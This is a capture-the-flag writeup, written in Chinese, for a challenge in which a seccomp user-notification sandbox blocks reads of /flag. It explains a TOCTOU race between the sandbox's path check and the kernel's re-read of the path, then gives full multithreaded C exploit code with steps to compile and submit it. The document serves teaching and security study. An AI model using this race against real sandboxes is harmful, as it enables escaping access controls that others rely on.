---
title: 'AIS3 EOF 2026 Writeup: Seccomp As A Sandbox (SaaS)'
tags: [CTF]

---

這是一個非常經典的利用 **Seccomp User Notification (seccomp-unotify)** 機制缺陷進行 **TOCTOU (Time-of-Check to Time-of-Use)** 攻擊的題目。

以下是完整的 Writeup，包含題目分析、漏洞原理、攻擊程式碼以及操作步驟。

---

# CTF Writeup: Seccomp As A Sandbox (SaaS)

## 1. 題目分析 (Analysis)

題目提供了一個自製的沙箱 (`seccomp-sandbox.c`)，用來執行使用者上傳的二進位檔案。沙箱使用了 Linux 的 `seccomp` 機制來限制系統呼叫（System Call）。

### 沙箱邏輯

檢視 `seccomp-sandbox.c`，我們可以發現以下關鍵行為：

1. **啟用通知機制**：
沙箱使用 `SCMP_ACT_NOTIFY` 來攔截與檔案開啟相關的 syscall，例如 `open`, `openat`, `openat2` 等。
```c
seccomp_rule_add(ctx, SCMP_ACT_NOTIFY, SCMP_SYS(open), 0);

```


2. **處理通知 (`notif_handler`)**：
當受害程式（我們上傳的程式）呼叫 `open` 時，Kernel 會暫停該進程，並通知沙箱。沙箱會執行以下檢查：
* 使用 `process_vm_readv` 從受害進程的記憶體中讀取檔案路徑參數。
* 使用 `realpath` 解析路徑，檢查是否指向 `/flag`。
* 如果是 `/flag`，則回傳 `-EPERM` 阻擋；否則回傳 `SECCOMP_USER_NOTIF_FLAG_CONTINUE` 讓 Kernel 繼續執行。



### 漏洞原理：TOCTOU (Time-of-Check to Time-of-Use)

這個機制的致命弱點在於**「檢查」與「使用」不是原子操作 (Atomic Operation)**。

1. **Check (檢查)**：沙箱讀取我們的記憶體，看到路徑是合法的（例如 `/dev/null`），於是通知 Kernel 放行。
2. **Race Window (時間差)**：在沙箱發出「放行」訊號之後，到 Kernel 真正恢復執行並去讀取參數之前，有一段極短的時間差。
3. **Use (使用)**：Kernel 恢復執行 `open` syscall，它**不會**使用沙箱剛剛讀取的那份資料，而是**重新從使用者記憶體讀取**路徑字串。

如果在 Kernel 第二次讀取之前，我們修改了記憶體中的字串，就可以讓沙箱檢查 A，但 Kernel 打開 B。

## 2. 攻擊策略 (Exploit Strategy)

我們需要撰寫一個**多執行緒 (Multi-threaded)** 的 C 語言程式：

* **Thread 1 (Switcher)**：在一個共享的緩衝區 `buf` 中，瘋狂切換寫入 `/dev/null` (合法) 和 `/flag` (非法)。
* **Thread 2 (Main)**：在無窮迴圈中不斷呼叫 `open(buf)`。

只要運氣好，就會發生以下順序，導致成功讀取 Flag：

1. `open(buf)` 被呼叫。
2. Sandbox 讀取 `buf` -> 讀到 `/dev/null` -> **Pass**。
3. **[Switcher 修改 `buf` 為 `/flag`]**
4. Kernel 恢復執行，讀取 `buf` -> 讀到 `/flag` -> **Open Success**。

## 3. 攻擊程式碼 (Exploit Code)

將以下程式碼存為 `exploit.c`：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

// 定義競爭用的路徑
char *SAFE_PATH = "/dev/null"; // 用來騙沙箱
char *FLAG_PATH = "/flag";     // 真正的目標

// 共享記憶體
char path_buf[128];
int stop = 0;

// [Thread 1] 負責瘋狂修改記憶體
void *switcher(void *arg) {
    while (!stop) {
        strcpy(path_buf, SAFE_PATH);
        strcpy(path_buf, FLAG_PATH);
    }
    return NULL;
}

int main() {
    pthread_t tid;
    char flag_content[256];
    
    // 初始化為安全路徑
    strcpy(path_buf, SAFE_PATH);

    // 啟動 Switcher 執行緒
    if (pthread_create(&tid, NULL, switcher, NULL) != 0) {
        perror("pthread_create");
        return 1;
    }

    printf("[*] Starting TOCTOU attack...\n");

    // [Thread 2] 主程式負責不斷嘗試打開檔案
    // 由於題目限制 5 秒，我們就全速跑迴圈
    while (!stop) {
        int fd = open(path_buf, O_RDONLY);
        
        if (fd >= 0) {
            // 嘗試讀取
            int len = read(fd, flag_content, sizeof(flag_content) - 1);
            if (len > 0) {
                flag_content[len] = '\0';
                
                // 判斷是否讀到了 Flag (特徵包含 '{' 或長度足夠)
                // 排除讀到 /dev/null 的情況
                if (strchr(flag_content, '{') || len > 10) {
                    printf("\n[+] Race Won! Flag found:\n");
                    printf("%s\n", flag_content);
                    stop = 1;
                    close(fd);
                    break;
                }
            }
            close(fd);
        }
    }
    
    // 等待執行緒結束
    stop = 1;
    pthread_join(tid, NULL);
    return 0;
}

```

## 4. 編譯與執行 (Execution)

由於這是在遠端 Linux Docker 環境執行，且我們需要多執行緒支援，編譯時有兩個重點：

1. **靜態連結 (`-static`)**：確保程式不依賴遠端環境的動態函式庫版本。
2. **連結 pthread (`-lpthread`)**：啟用多執行緒支援。

### 步驟 1：編譯

在你的 Linux 環境 (WSL/VM) 中執行：

```bash
gcc exploit.c -o exploit -lpthread -static

```

### 步驟 2：計算 Proof of Work (POW)

題目網頁要求使用 `hashcash` 計算 stamp。

```bash
# 請替換題目網頁當下顯示的 hash 值
hashcash -mb24 <hash_from_challenge>

```

將輸出的結果（例如 `1:24:251220:...`）填入網頁的 Stamp 欄位。

### 步驟 3：上傳並獲取 Flag

1. 在網頁上點擊 Upload，選擇編譯好的 `exploit` 執行檔。
2. 點擊 Submit。
3. 查看 Output 區域。

**預期輸出：**

{"returncode":0,"stderr":"[sandbox] blocked open /flag\n","stdout":"[*] Exploit running...\nEOF{TICTACTOE_TICKTOCTOU}\n\n","timeout":false}


![image](https://hackmd.io/_uploads/SyZJwe4X-l.png)
